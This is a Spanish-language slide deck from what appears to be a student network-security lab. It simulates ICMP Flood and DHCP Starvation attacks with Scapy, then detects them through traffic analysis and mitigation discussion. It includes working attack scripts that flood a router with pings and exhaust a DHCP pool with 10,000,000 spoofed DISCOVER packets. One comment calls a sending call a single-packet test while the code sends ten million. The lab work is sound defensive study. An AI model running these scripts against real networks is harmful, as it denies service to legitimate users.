@@ -1,0 +1,323 @@
+---
+title: "Simulación, Diagnóstico y Prevención de Ataques de Red"
+subtitle: "Análisis de ICMP Flood y DHCP Starvation"
+author:
+  - Camila Guzmán
+  - Damián Luna
+  - Juan Pablo de la Peña
+  - Gonzalo Higuera
+  - Alfredo Lopez
+format:
+  revealjs:
+    transition: zoom
+    backgroundTransition: fade
+    slideNumber: true
+    progress: true
+    overview: true
+    theme: [simple]
+    incremental: true
+    autoAnimate: true
+    css: styles.css
+    plugins: [fragment]
+---
+
+## Abstract
+
+El trabajo analiza dos ataques DoS: ICMP Flood y DHCP Starvation.
+
+
+Para ello, se construyó un laboratorio
+
+- se configuró una topología de red
+- se lanzaron ambos ataques
+- se capturó el tráfico con herramientas con Scapy y Wireshark.
+
+Posteriormente, se aplicaron técnicas de ciencia de datos a los archivos *pcapng* para detectar anomalías asumiendo el no conocer previamente la existencia de los ataques.
+
+Finalmente, se utilizó una inteligencia artificial (ChatGPT 5.1) para obtener un diagnóstico adicional y recomendaciones de mitigación.
+
+Los resultados muestran la alta efectividad de ambos ataques para afectar la disponibilidad del servicio y destacan la importancia de implementar controles como DHCP Snooping, port security, limitación de ICMP, IDS/IPS y monitoreo continuo en infraestructuras reales.
+
+---
+
+### Fase 1: Diseño del escenario y explicación del ataque
+
+**En el primer intento**
+
+se descubrió que, dada la configuración del switch en el laboratorio de pruebas, el análisis solamente podrá ser realizado desde el ordenador de la víctima.
+
+---
+
+## SObre los Ataques
+- **DHCP Starvation**envía numerosas solicitudes DHCP falsas con direcciones MAC distintas para agotar el rango de direcciones IP disponibles - impidiendo que dispositivos legítimos obtengan configuración de red-.
+
+-  **Ping Flood**  envía un gran volumen de paquetes ICMP Echo Request para saturar el ancho de banda o recursos del sistema objetivo.
+
+---
+
+## Creación del Entorno
+
+- Se recrea la topología con una máquina víctima/consola y un atacante/analista.
+- Se configura DHCP con exclusión de las primeras 10 IP; la primera corresponde al router.
+- Se verifica comunicación mediante pings infinitos.
+
+---
+
+
+### Scripts
+
+Para el grupo DHCP
+```python
+conf t
+
+
+ip dhcp excluded-address 192.168.10.1 192.168.10.10
+
+ip dhcp pool LAB
+ network 192.168.10.0 255.255.255.0
+ default-router 192.168.10.1
+ dns-server 8.8.8.8
+
+```
+
+Demás conecciones
+
+```python
+
+interface GigabitEthernet0/1    
+ ip address 192.168.10.1 255.255.255.0
+ no shutdown
+
+interface GigabitEthernet0/0
+ ip address 10.0.0.1 255.255.255.252
+ no shutdown
+
+```
+
+---
+
+## PING FLOOD
+
+Se usa **Scapy** para construir un ataque ICMP:
+
+- Dirección objetivo: 192.168.10.21  
+- 1,000 paquetes  
+- Tamaño: 65,000 bytes (máximo de ICMP)
+
+```python
+from scapy.layers.inet import IP, ICMP
+from scapy.packet import Raw
+from scapy.sendrecv import send
+
+def send_ping(target_ip_address: str, number_of_packets_to_send: int = 4, size_of_packet: int = 1450):
+    ip = IP(dst=target_ip_address)
+    icmp = ICMP()
+    raw = Raw(b"X" * size_of_packet)
+    p = ip / icmp / raw
+    send(p, count=number_of_packets_to_send, verbose=0)
+    print('send_ping(): Sent ' + str(number_of_packets_to_send) + ' pings of ' + str(size_of_packet) + ' size to ' + target_ip_address)
+
+
+ip = "192.168.10.1"
+send_ping(ip, number_of_packets_to_send=10000)
+```
+- El script es ejecutado desde la terminal del atacante
+
+- **En Wireshark** esto se contempla como un conjunto masivo de observaciones donde se reporta el protocolo ICMP hacia **192.168.10.1** y sus Echos correspondientes.
+
+---
+
+## DHCP Starvation
+
+Se utiliza igualmente **scapy**
+
+
+```python
+# dhcpStarvation_helper.py
+from scapy.all import (
+    Ether, IP, UDP, BOOTP, DHCP,
+    RandMAC, sendp, get_if_list, get_if_addr
+)
+import sys
+
+# Construir el DHCP Discover
+dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC()) / \
+    IP(src='0.0.0.0', dst='192.168.10.255') / \
+    UDP(sport=68, dport=67) / \
+    BOOTP(op=1, chaddr=RandMAC()) / \
+    DHCP(options=[('message-type','discover'), ('end')])
+```
+
+---
+
+
+```python
+def find_iface_by_subnet(prefix="192.168.10."):
+    """
+    Busca una interfaz cuya IP empiece con prefix.
+    Devuelve el nombre de la interfaz o None.
+    """
+    for iface in get_if_list():
+        try:
+            ip = get_if_addr(iface)
+            if ip and ip.startswith(prefix):
+                return iface
+        except Exception:
+            # algunas interfaces no tienen IP o generan excepción
+            pass
+    return None
+
+```
+---
+
+```python
+def choose_interface(preferred_prefix="192.168.10."):
+    # 1) si el usuario pasa el nombre por argumento de línea de comandos, usarlo
+    if len(sys.argv) > 1:
+        return sys.argv[1]
+
+    # 2) buscar por prefijo de subred (útil en el aula)
+    iface = find_iface_by_subnet(preferred_prefix)
+    if iface:
+        return iface
+
+    # 3) heurística: elegir primera interfaz "Ethernet" o "Wi-Fi" si aparece
+    ifaces = get_if_list()
+    for name in ifaces:
+        if "Ethernet" in name or "eth" in name.lower():
+            return name
+    for name in ifaces:
+        if "Wi-Fi" in name or "wlan" in name.lower() or "wifi" in name.lower():
+            return name
+
+    # 4) fallback: la primera que no sea loopback
+    for name in ifaces:
+        if "loop" not in name.lower():
+            return name
+
+    # 5) si no hay nada, devolver None
+    return None
+```
+---
+
+```python
+def main():
+    print("Interfaces detectadas por Scapy:", get_if_list())
+
+    iface = choose_interface()
+    if iface is None:
+        print("ERROR: No se pudo detectar una interfaz válida.")
+        print("Prueba a ejecutar: python dhcpStarvation_helper.py \"Ethernet\"")
+        return
+
+    print("Interfaz elegida:", iface)
+    print("Haciendo envío de prueba (count=1). Si esto falla, revisa Npcap y permisos.")
+
+    try:
+        # prueba segura: solo un paquete
+        sendp(dhcp_discover, iface=iface, count=10000000, verbose=1)
+        print("Envío realizado. Si ves tráfico en Wireshark/PCAP, ya funciona.")
+    except Exception as e:
+        print("Error al enviar paquetes con Scapy:")
+        print(str(e))
+        print("\nPosibles causas:")
+        print("- No estás ejecutando como administrador.")
+        print("- No tienes Npcap instalado (o no en modo 'WinPcap API-compatible').")
+        print("- El adaptador físico está desconectado o en otra VLAN.")
+        print("- El nombre de interfaz detectado no es correcto para tu sistema.")
+        print("\nSolución rápida: ejecuta el script desde PowerShell/CMD como administrador o")
+        print("pasa el nombre de la interfaz manualmente: python dhcpStarvation_helper.py \"Ethernet\"")
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+
+- En WireShark, esto se representa en múltiples solicitudes DHCP. 
+
+- Para verificar, en la consola se buscan los estadísticos del servidor DHCP
+    - se verifica que 244 IPs fueron asignadas (recordemos que las primeras 10 direcciones fueron omitidas y una corresponde al router).
+
+---
+
+### Conclusión de sección
+
+La práctica confirma que, en un entorno controlado, tanto el DHCP Starvation como el Ping Flood son capaces de degradar y/o interrumpir el servicio de red
+
+- el primero acapara las direcciones disponibles del servidor DHCP (245 leases asignados en la prueba) 
+- el segundo crea congestión perceptible en la conectividad ICMP hacia el router
+
+---
+
+# Fase 3: Análisis de datos con Python
+
+**El objetivo**
+
+poder identificar los ataques realizados desde el puesto de un analista de tráfico
+
+- desconoce su realización
+- se convirtió el archivo *pcapng* de la ventana de tiempo de la simulación a un **csv** 
+- se abre con Python para poder analizar y hacer visualizaciones del comportamiento de paquetes junto con sus anomalías detectadas
+
+---
+
+## Resultados
+
+Se grafica el flujo de paquetes a través del tiempo.
+- incremento significante en referencia al tráfico no priorizado
+    - primeros diez minutos
+    - minutos 37 y 42.
+
+![Time Series of Package traffic (All packets)](../figures/lineChartAllPackets.png)
+
+---
+
+Se descubre que hubo una proporción excesiva de paquetes ICMP y DHCP, la cual excede en millones al resto de protocolos. 
+
+Esta evidencia levanta sospechas al ser comportamiento anómalo.
+
+![Top IPs by Protocol](../figures/top_by_protocol.png)
+
+---
+
+Al sobreponer este filtro de paquetes sobre la linea de tiempo anterior, se comprueba que esos protocolos son el origen de los picos de tráfico. 
+
+![Time Series of ICMP and DHCP Package traffic](../figures/lineChart.png)
+
+---
+
+- direcciones IP origen y destino ordenadas por frecuencia
+- **El hallazgo** 
+    -  la dirección conflictiva es la 192.168.10.13
+    -  dirección victima es la 192.168.10.1 (ruteador)
+
+Esto da indicadores de ataques con intención de deshabilitarlo.
+
+![Top IPs by Destination](../figures/top_by_destination.png)
+
+![Top IPs by Source](../figures/top_by_source.png)
+
+---
+
+La línea de tiempo muestra dos fases distintas de ataque: 
+
+**ICMP Flood** 
+- es más rápido y visible, ya que satura el ancho de banda o la capacidad de respuesta del servidor mediante miles de solicitudes ping
+- Es eficiente a corto plazo, pero fácil de detectar y mitigar (por firewalls o limitación de ICMP).
+
+**DHCP Starvation**
+- no genera tanto tráfico, pero bloquea la asignación de IPs válidas a los clientes legítimos
+- silencioso y persistente
+    - más eficiente estratégicamente, especialmente en redes locales (LAN).
+
+![Time Series of ICMP and DHCP Package traffic](../figures/lineChart.png)
+
+---
+
+### Conclusión de Fase
+
+Aunque ambos ataques logran afectar la disponibilidad de la red, el DHCP Starvation es más eficiente a nivel estratégico, ya que usa menos recursos para saturar el serivcio del router. En cambio, el ICMP Flood provoca un impacto inmediato con un pico más alto, pero es más fácil de detectar y bloquear.
+
+---
